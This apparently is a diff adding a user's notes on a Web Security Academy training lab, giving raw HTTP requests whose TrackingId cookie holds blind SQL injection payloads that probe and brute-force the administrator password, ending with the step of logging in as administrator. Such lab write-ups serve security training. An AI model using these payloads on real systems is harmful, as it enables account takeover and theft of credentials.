@@ -1,0 +1,43 @@
+Blind SQL injection with conditional responses
+
+The solution provided is great. To help in finding the password length, here's the request that worked for me:
+
+GET / HTTP/1.1
+Host: acd91f181e57f9e880101492009b00b5.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://acd91f181e57f9e880101492009b00b5.web-security-academy.net/
+Cookie: TrackingId=TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>19--; session=96qXzLH01cyWteIdhBNi6isOSltcwGbd
+Upgrade-Insecure-Requests: 1
+
+The intruder request:
+
+GET / HTTP/1.1
+Host: acd91f181e57f9e880101492009b00b5.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://acd91f181e57f9e880101492009b00b5.web-security-academy.net/
+Cookie: TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='§a§'--; session=96qXzLH01cyWteIdhBNi6isOSltcwGbd
+Upgrade-Insecure-Requests: 1
+
+Final intruder request:
+
+GET / HTTP/1.1
+Host: acd91f181e57f9e880101492009b00b5.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://acd91f181e57f9e880101492009b00b5.web-security-academy.net/
+Cookie: TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,20,1)='§a§'--; session=96qXzLH01cyWteIdhBNi6isOSltcwGbd
+Upgrade-Insecure-Requests: 1
+
+
+Make note of the password and use it to login as administrator.
